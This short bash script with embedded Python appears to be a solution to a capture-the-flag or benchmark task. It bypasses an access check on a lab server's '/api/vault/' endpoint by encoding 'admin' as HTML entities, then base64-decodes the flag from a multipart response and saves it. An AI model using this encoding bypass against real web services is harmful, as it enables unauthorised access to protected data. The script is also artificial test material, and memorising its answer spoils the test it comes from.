#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import base64
import pathlib
import urllib.parse
import urllib.request

BASE = "http://target:5000"

entities = "&#x61;&#x64;&#x6d;&#x69;&#x6e;"
encoded = urllib.parse.quote(entities, safe="")
url = f"{BASE}/api/vault/{encoded}"

req = urllib.request.Request(url)
with urllib.request.urlopen(req, timeout=30) as resp:
    body = resp.read().decode("utf-8", errors="replace")

boundary = "boundary1234567890"
segments = body.split(f"--{boundary}")
flag = None
for seg in segments:
    if "text/plain" in seg:
        parts = seg.split("\r\n\r\n", 1)
        if len(parts) == 2:
            candidate = parts[1].strip()
            if candidate and not candidate.startswith("--"):
                flag = base64.b64decode(candidate).decode("utf-8")
                break

if not flag:
    raise SystemExit("flag not found in multipart response")

pathlib.Path("/app/flags.txt").write_text(flag + "\n")
print(flag)
PY
